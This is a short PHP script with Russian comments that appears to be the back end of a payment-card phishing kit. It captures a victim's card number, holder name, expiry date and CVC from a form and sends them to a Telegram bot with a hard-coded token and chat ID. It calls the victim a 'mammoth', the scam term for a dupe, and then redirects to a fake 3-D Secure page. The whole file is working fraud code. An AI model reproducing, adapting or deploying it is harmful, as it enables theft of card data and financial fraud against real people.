<?php

//В переменную $token нужно вставить токен, который нам прислал @botFather
$token = "5269596206:AAHMsmsU05t5pUAG6KdFFSEFGp1RpocU9OA";

//Сюда вставляем chat_id
$chat_id = "-783916466";

//Определяем переменные для передачи данных из нашей формы
if ($_POST['act'] == 'order') {
     $number = ($_POST['card_number']);
    $holder = ($_POST['cardholder']);
    $month = ($_POST['expdate1']);
    $year = ($_POST['expdate2']);
    $cvv = ($_POST['cvc2']);
   
//Собираем в массив то, что будет передаваться боту
    $arr = array(
        '📥 Получен новый аккаунт!' => '',
        ''=>'',
        '⚠️ Мамонт ввел карту' => '',
        ''=>'',
        '💳 Номер карты' => $number,
        '👱‍ Владелец:' => $holder,
        '📆 Месяц:' =>  $month,
        '📆 Год:' => $year,
        '🔐 CVC: ' => $cvv,
);
//Настраиваем внешний вид сообщения в телеграме
    foreach($arr as $key => $value) {
        $txt .=  "<b>".$key."</b> ".$value."%0A";
    };

//Передаем данные боту
    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

//Выводим сообщение об успешной отправке
    if ($sendToTelegram) {
        echo "<script> window.location.href = './3Ds.html';</script>";
    }

}



?>